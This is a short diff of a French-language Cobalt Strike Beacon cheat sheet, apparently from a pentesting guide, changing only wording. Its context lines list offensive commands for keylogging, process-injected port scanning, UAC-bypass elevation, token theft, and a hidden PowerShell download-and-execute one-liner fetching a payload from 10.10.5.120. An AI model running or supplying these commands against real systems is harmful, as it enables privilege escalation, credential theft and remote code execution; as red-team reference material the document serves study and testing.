@@ -50,7 +50,7 @@ keylogger [pid] [x86|x64]
 ## View > Keystrokes pour voir les touches pressées
 
 # portscan
-portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Injecter l'action de scan de port dans un autre processus
+portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Injecter l'action de scan de port à l'intérieur d'un autre processus
 portscan [targets] [ports] [arp|icmp|none] [max connections]
 
 # Powershell
@@ -70,7 +70,7 @@ elevate svc-exe &#x3C;listener>
 elevate uac-token-duplication &#x3C;listener>
 runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
 
-## Vol de token depuis pid
+## Voler le token depuis pid
 ## Comme make_token mais en volant le token d'un processus
 steal_token [pid] # De plus, cela est utile pour les actions réseau, pas pour les actions locales
 ## D'après la documentation de l'API, nous savons que ce type de connexion "permet à l'appelant de cloner son token actuel". C'est pourquoi la sortie du Beacon dit Usurpé &#x3C;current_username> - il usurpe notre propre token cloné.
